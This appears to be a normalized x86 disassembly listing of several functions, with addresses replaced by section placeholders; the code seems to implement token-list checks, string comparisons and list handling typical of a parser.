pop ebp
retn
mov eax 0x68
sub_10074a80
mov eax [ ecx + 0x20 ]
sub eax 0x0
je r-xdata
push 0x96
push 0x85
push 0x43
push 0x1e
push 0x66
push 0x2
push 0x64
push 0x68
push 0x65
push 0x73
push 0x67
push 0x63
push 0x5f
push 0x79
push 0x6
push 0x6f
push 0xc
push 0x7
push 0x1b
push 0x88
push 0x4b
push 0x19
push 0x1d
push 0x4a
push 0x8
push 0x82
push 0x87
push 0xd
push 0x5
push 0x7a
push 0x90
push 0x84
push 0x4
push 0x1f
push 0x83
push 0x6d
push 0x47
push 0x48
push 0x0
push 0x1a
push 0x15
push 0x16
push 0x1
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x81
push 0x80
push 0x69
push 0x17
push 0x23
push 0x24
push 0x6a
push 0x49
push 0x21
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x22
push 0x7b
push 0x61
push 0x62
push 0x8e
push 0x60
push 0x6e
push 0x42
push 0xa
push 0x1c
push 0x7e
push 0x8b
push 0x3
push 0xe
push 0xb
push 0x52
push 0x7c
push 0x18
push ecx
call sub_10073780
add esp 0x144
retn
dec eax
je r-xdata
push 0x96
push 0x5e
push 0x5d
push ecx
call sub_10073780
add esp 0x10
retn
dec eax
je r-xdata
push 0x96
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push ecx
call sub_10073780
add esp 0x20
retn
call sub_10030ed0
sub_10074ba0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi ecx
mov ebx 0x1
call sub_10074860
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
cmp [ ecx ] ebx
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov eax [ ebp + 0x8 ]
push esi
call sub_10073670
add esp 0x4
push edi
mov eax esi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
jne r-xdata
cmp [ ecx + 0x1c ] edi
je r-xdata
xor ebx ebx
mov edi edi
mov eax esi
call sub_10073b20
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
mov eax esi
call sub_10073b20
push edi
mov eax esi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
je r-xdata
sub_10074c20
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x6e
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
push 0x7c
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x19
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] 0x1
call sub_100744e0
add esp 0x58
test eax eax
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
mov eax 0x19
mov ecx esi
call sub_10074ba0
add esp 0x4
mov esp ebp
pop ebp
retn
sub_10074ca0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ eax + 0xc ]
push edi
mov edi [ ebx + 0xc ]
dec edi
mov [ ebx + 0x3c ] 0x0
js r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esp [ esp ]
push 0x96
push 0x21
push 0x22
push esi
call sub_10073780
add esp 0x10
test eax eax
jne r-xdata
cmp [ esi ] 0x1
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x1c ]
mov ecx [ ebp + 0x8 ]
push edx
call sub_10074ba0
add esp 0x4
mov ecx esi
call sub_10074a80
test eax eax
je r-xdata
cmp [ esi + 0x1c ] 0x1f
jne r-xdata
dec edi
jns r-xdata
push 0x96
push 0x19
push 0x26
push 0x18
push esi
call sub_10073780
add esp 0x14
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebx + 0x8 ]
mov esi [ ecx + edi * 4 ]
je r-xdata
pop esi
pop edi
pop ebx
pop ebp
retn
pop esi
sub_10074d30
push ebp
mov ebp esp
push ecx
push esi
add eax 0x4c
xor esi esi
mov [ ebp - 0x4 ] eax
cmp [ edi + 0x20 ] esi
jbe r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_1001d270
add esp 0x8
pop esi
mov esp ebp
pop ebp
retn
push ebx
inc esi
cmp esi [ edi + 0x20 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push ecx
push ebx
push edx
call sub_10006860
mov eax [ edi + 0x1c ]
add esp 0xc
mov [ eax + esi * 4 ] 0x0
mov ecx [ edi + 0x1c ]
mov ebx [ ecx + esi * 4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
push edx
push eax
call sub_10069d70
add esp 0x8
test eax eax
jne r-xdata
pop ebx
sub_10074da0
push ebp
mov ebp esp
push ecx
push ebx
push esi
add eax 0x1c
push edi
mov [ ebp - 0x4 ] eax
mov edi rw-data
mov ebx 0xc
add edi 0xc
dec ebx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1006db40
mov edx [ edi + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ esi ] edx
mov eax [ edi ]
push eax
push ecx
call sub_1004ab70
add esp 0x10
mov [ esi + 0x4 ] eax
mov ecx [ edi - 0x4 ]
mov edx [ ebp - 0x4 ]
push ecx
push edx
call sub_10069d70
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10074e00
push ebp
mov ebp esp
push ebx
push esi
push edi
lea ebx [ eax + 0x1c ]
xor esi esi
jmp r-xdata
mov eax [ esi + rw-data ]
push eax
push ebx
call sub_10069d70
mov edi eax
add esp 0x8
test edi edi
je r-xdata
add esi 0x10
cmp esi 0x3e0
jb r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call sub_1006db40
mov eax [ esi + rw-data ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1004ab70
add esp 0x10
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10074e60
push esi
add eax 0x1c
push r--data
push eax
call sub_10069d70
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi + 0x4 ]
push ecx
push edi
call sub_1006db40
push r--data
push edi
call sub_1004ab70
add esp 0x10
mov [ esi + 0x4 ] eax
sub_10074ea0
push ebp
mov ebp esp
mov ecx [ eax ]
mov eax [ esi + 0x4 ]
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov eax [ esi + 0x8 ]
cmp [ esi + 0x14 ] eax
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov eax 0x1
pop ebp
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_10074f20
push ebp
mov ebp esp
mov eax [ ebx + 0x18 ]
push esi
lea esi [ ebx + 0x18 ]
push edi
mov ecx r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_10073670
add esp 0x4
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp [ esi + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov edi [ esi + 0x4 ]
mov ecx [ r--data ]
mov eax edi
cmp [ esi + 0x14 ] 0x0
je r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx r--data
mov edi edi
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov ecx [ r--data ]
mov eax edi
mov ecx [ r--data ]
mov eax [ esi + 0x8 ]
lea ebx [ ebx ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push 0x0
push r--data
mov eax r--data
call sub_10074ea0
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ r--data ]
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
push eax
push r--data
mov eax r--data
call sub_10074ea0
add esp 0x8
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_100750d0
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ eax + 0xc ]
push r--data
mov [ ebp - 0x4 ] edi
call sub_100386a0
add esp 0x4
mov [ ebp - 0x20 ] 0x0
push r--data
call sub_100386a0
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x14 ]
lea ecx [ ecx + eax * 4 ]
push r--data
call sub_100386a0
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x1
jne r-xdata
sub ecx 0x4
dec eax
jns r-xdata
mov edx [ ebp + 0x10 ]
cmp [ ebx + 0x1c ] edx
je r-xdata
mov ebx [ ecx ]
mov [ ebp - 0x1c ] ebx
cmp ebx r--data
je r-xdata
add edi 0x8
push ebx
push edi
call sub_1004a260
mov esi eax
mov eax [ ebp + 0x10 ]
add esp 0x8
push esi
push eax
call sub_1004bc00
add esp 0x4
push eax
push r--data
call sub_100386a0
add esp 0xc
cmp esi 0xffffffff
je r-xdata
push r--data
call sub_100386a0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
add eax 0x14
push eax
push ebx
push ecx
call sub_1003e150
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
mov ecx [ ebx + 0x1c ]
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov eax 0x1
push 0x7c
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
push 0x0
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x18 ]
push ecx
mov [ ebp - 0x3c ] edx
call sub_100744e0
add esp 0x54
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push edx
call sub_10073670
push r--data
call sub_100386a0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
call sub_10073470
cmp ebx eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
cmp esi [ eax + 0xc ]
jae r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push edx
call sub_10073670
add esp 0x4
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10073470
cmp eax ebx
je r-xdata
mov ecx [ edi ]
mov edx [ ebp - 0x8 ]
mov esi [ ecx + edx * 4 ]
mov ecx esi
mov [ ebp - 0xc ] esi
call sub_10074a80
test eax eax
jne r-xdata
mov eax esi
call sub_10073b20
mov edx [ ebp - 0x4 ]
add edx 0x14
push edx
push ebx
push esi
call sub_1003e150
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_10073b20
mov eax esi
call sub_10073470
cmp eax ebx
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ecx + 0xc ]
jb r-xdata
push ebx
push edi
call sub_1004a260
mov edx [ edi ]
mov ecx [ esi + 0x1c ]
mov eax [ edx + eax * 4 - 0x4 ]
push ecx
mov [ ebp - 0x18 ] eax
call sub_1004bc00
mov edx [ ebp - 0x18 ]
add esp 0xc
push eax
mov eax [ edx + 0x1c ]
push eax
call sub_1004bc00
add esp 0x4
push eax
push r--data
call sub_100386a0
mov eax [ ebp - 0x4 ]
add eax 0x14
push ebx
push eax
call sub_1004a260
push esi
push edi
mov [ ebp - 0x8 ] eax
mov ebx esi
call sub_1004a260
add esp 0x1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov esi [ ecx + edi * 4 - 0x4 ]
dec edi
add eax 0x14
push esi
push eax
mov [ ebp - 0x10 ] edi
call sub_1004a260
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov edi esi
cmp esi [ ebp - 0x1c ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
add eax 0x8
push eax
push edi
push edx
call sub_100307a0
jmp r-xdata
mov ecx [ ebx + 0x1c ]
push ecx
call sub_1004bc00
push eax
push r--data
call sub_100386a0
mov esi [ ebx + 0x4 ]
add esp 0xc
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
push esi
push eax
call sub_1004a260
push 0x100
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_100491a0
mov ecx [ ebp - 0x24 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov [ edx + ecx * 4 ] esi
mov eax [ eax + 0x8 ]
add esp 0x14
mov [ eax + edi * 4 ] esi
cmp ebx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x14 ]
inc eax
add esp 0xc
mov [ ebp - 0x14 ] eax
cmp eax 0x3
jl r-xdata
mov edi [ ebp + 0x8 ]
add esi 0x10
push ebx
push esi
call sub_1004a260
mov edi [ ebp + 0x8 ]
push esi
push eax
push edi
mov [ ebp - 0x24 ] eax
call sub_100307a0
mov eax [ ebp - 0x24 ]
add esp 0x14
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0xffffffff
cmp eax [ esi + 0x4 ]
jae r-xdata
mov edi [ ebx + 0x4 ]
or [ ebx + 0xc ] 0x200
test edi edi
je r-xdata
inc ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x8
push esi
push eax
call sub_1004a260
mov esi [ ebp - 0x10 ]
mov edi eax
push esi
push edi
push r--data
call sub_100386a0
add esp 0x14
cmp edi 0xffffffff
jne r-xdata
mov edx [ esi + 0x1c ]
push edx
call sub_1004bc00
push eax
push r--data
call sub_100386a0
add esp 0xc
lea eax [ esi + 0x10 ]
push eax
mov [ ebx + 0x4 ] esi
mov ecx [ eax + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] ecx
call sub_10006860
add esp 0xc
push r--data
call sub_100386a0
push edi
call sub_100738b0
add esp 0x8
jmp r-xdata
mov esi [ ebp - 0x18 ]
or [ ebx + 0xc ] 0x200
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push esi
call sub_10073780
add esp 0x1c
test eax eax
je r-xdata
lea esp [ esp ]
lea eax [ esi + 0x10 ]
push eax
mov [ ebx + 0x4 ] esi
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov [ ebx + 0x8 ] edx
call sub_10006860
mov ebx esi
add edi 0x10
push ebx
push edi
call sub_1004a260
mov ecx [ ebp + 0x8 ]
push edi
push eax
push ecx
mov [ ebp - 0x24 ] eax
call sub_100307a0
mov eax [ ebp - 0x24 ]
add esp 0x14
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0xffffffff
cmp eax [ edi + 0x4 ]
jae r-xdata
mov ecx [ ebp - 0xc ]
push eax
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x4 ]
push esi
push edi
mov [ esi + 0x8 ] edx
call sub_10006860
mov eax [ ebp - 0x4 ]
add eax 0x14
push ebx
push eax
mov [ ebp - 0x1c ] eax
call sub_1004a260
add esp 0x14
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov edx [ ebp - 0x30 ]
mov edx [ edx + ecx * 4 ]
inc ecx
mov [ edx + 0x4 ] esi
cmp ecx [ ebp - 0x2c ]
jb r-xdata
mov ebx [ ebp - 0x1c ]
push 0x100
push ebx
push edi
call sub_100491a0
or [ ebx + 0xc ] 0x2
mov esi eax
mov eax [ esi + 0x18 ]
mov edx [ esi + 0x14 ]
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
add eax 0x10
mov [ ebp - 0x2c ] edx
mov edx [ eax ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x8 ]
mov [ esi + 0x18 ] edx
mov edx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x14 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x28 ] ecx
add esp 0xc
xor ecx ecx
mov [ ebp - 0x2c ] edx
test edx edx
je r-xdata
mov edx [ esi ]
mov ecx [ edx + eax * 4 ]
mov [ ecx + 0x8 ] eax
inc eax
cmp eax [ esi + 0x4 ]
jb r-xdata
jmp r-xdata
lea esp [ esp ]
mov ecx [ ebp - 0x1c ]
push ecx
push eax
push edi
call sub_100307a0
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
push edx
push eax
push esi
push edi
call sub_10034010
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
push ebx
push edi
mov [ ebp - 0x24 ] eax
call sub_1003e150
mov ecx [ ebp - 0xc ]
mov ebx [ ebp - 0x24 ]
push ecx
push ebx
call sub_1004a260
push ebx
inc eax
push eax
push esi
push edi
call sub_10034010
mov eax [ ebp - 0x20 ]
inc eax
add esp 0x40
mov [ ebp - 0x20 ] eax
cmp eax 0x8
jge r-xdata
dec [ ebp - 0x8 ]
mov edx [ edi ]
mov ecx [ edx + eax * 4 ]
mov [ ecx + 0x8 ] eax
inc eax
cmp eax [ edi + 0x4 ]
jb r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ edi + 0x18 ]
dec eax
js r-xdata
sub_10075620
push esi
push edi
mov edi eax
call sub_100739c0
mov esi [ edi + 0xc ]
mov eax edi
call sub_10073b20
test eax eax
je r-xdata
mov eax edi
call sub_10073b20
test eax eax
jne r-xdata
cmp [ eax ] 0x1
jne r-xdata
pop edi
pop esi
retn
or [ eax + 0xc ] 0x2
mov ecx [ eax + 0x1c ]
cmp ecx 0xa
jne r-xdata
test ecx ecx
jne r-xdata
cmp [ esi + 0x6c ] 0x0
jne r-xdata
cmp [ esi + 0x70 ] ecx
jne r-xdata
mov eax edi
call sub_10073b20
test eax eax
jne r-xdata
sub_10075670
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx 0x4
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_1001d270
add esp 0x8
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
test ecx ecx
jne r-xdata
mov esi eax
mov eax edi
call sub_10073c00
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
push edi
call sub_10073670
mov eax 0x1
mov [ ebx + 0x2c ] eax
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx ] eax
mov ecx [ edi + 0xc ]
pop esi
pop edi
mov [ ecx + 0x34 ] eax
pop ebx
pop ebp
retn
mov [ ebx + 0x1c ] 0x1
mov ecx [ eax + 0x18 ]
lea esi [ eax + 0x18 ]
mov [ ebx + 0x20 ] ecx
mov edx [ eax + 0x1c ]
mov [ ebx + 0x24 ] edx
mov eax [ eax + 0x20 ]
mov [ ebx + 0x28 ] eax
call sub_10074410
mov [ ebx + 0x2c ] eax
mov ecx [ edi + 0xc ]
mov ebx [ ebp + 0xc ]
push edi
mov [ ecx ] 0x1
call sub_10074f20
add esp 0x4
pop esi
pop edi
pop ebx
pop ebp
retn
sub_10075720
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
test eax eax
jne r-xdata
push ebx
cmp eax 0x3
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10073670
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001d270
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
mov ebx [ edx ]
call sub_10073c00
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push eax
call sub_1001d270
add esp 0x8
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp eax 0x2
jne r-xdata
xor ecx ecx
cmp [ esi + 0x18 ] ecx
sete cl
test ecx ecx
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x0
mov eax 0x8
mov ecx esi
call sub_10073f70
mov edx [ esi + 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax ] 0x2
mov ecx [ esi + 0xc ]
pop ebx
pop edi
mov [ ecx + 0x34 ] 0x1
mov eax 0x1
pop esi
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x1
push 0x0
mov eax esi
call sub_10073730
add esp 0x18
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi esi
call sub_10073f30
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebx + 0xc ]
pop ebx
pop edi
mov [ edx ] 0x2
mov eax 0x1
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10073670
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001d270
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10075840
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
test eax eax
jne r-xdata
push ebx
cmp eax 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_10073670
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
mov esi 0x1
cmp eax esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov ecx [ edx + 0x68 ]
push ecx
push eax
call sub_1001d270
add esp 0x8
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_10073c00
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_10073c00
lea eax [ ebx + 0x1 ]
pop ebx
pop edi
pop esi
pop ebp
retn
cmp eax 0x2
jne r-xdata
xor ecx ecx
cmp [ edi + 0x18 ] esi
sete cl
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
push esi
mov eax 0x8
mov ecx edi
call sub_10073f70
mov ecx [ edi + 0xc ]
mov [ ecx ] 0x3
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx + 0x2c ] eax
mov eax [ edi + 0xc ]
pop ebx
mov [ eax + 0x34 ] esi
pop edi
mov eax esi
pop esi
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push esi
push 0x0
mov eax edi
call sub_10073730
add esp 0x18
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f30
mov edx [ ebx + 0xc ]
mov [ edx ] 0x3
mov ecx [ ebx + 0xc ]
pop ebx
mov [ ecx + 0x2c ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_10073670
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001d270
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10075980
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0xc ]
mov ebx [ edi ]
cmp ebx 0x4
jne r-xdata
push esi
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_100740e0
pop edi
lea eax [ ebx - 0x3 ]
pop ebx
pop ebp
retn
cmp ebx 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_10073670
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0xc
pop esi
pop edi
xor eax eax
pop ebx
pop ebp
retn
mov esi 0x1
cmp ebx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
push 0x96
push 0x4
push 0x7b
push 0x7e
push 0x8b
push 0x3
push esi
mov eax edi
call sub_10073730
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
cmp [ edi + 0x18 ] eax
sete al
test eax eax
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_10073c00
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
mov esi edi
mov ebx edx
call sub_10073c00
pop esi
pop edi
lea eax [ ebx + 0x1 ]
pop ebx
pop ebp
retn
cmp ebx esi
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f30
mov eax ebx
call sub_10073b20
mov eax [ ebx + 0xc ]
mov [ eax + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_10075cb0
add esp 0x8
pop esi
pop edi
pop ebx
pop ebp
retn
push 0x96
push 0x6
push 0x82
push esi
mov eax edi
call sub_10073730
add esp 0x10
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x5
sete cl
test ecx ecx
je r-xdata
cmp ebx esi
jne r-xdata
push 0x4
jmp r-xdata
xor edx edx
cmp eax 0x2
sete dl
mov eax edx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f30
mov eax ebx
call sub_10073b20
mov ecx [ ebx + 0xc ]
mov [ ecx + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
cmp ebx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x8
sete cl
test ecx ecx
je r-xdata
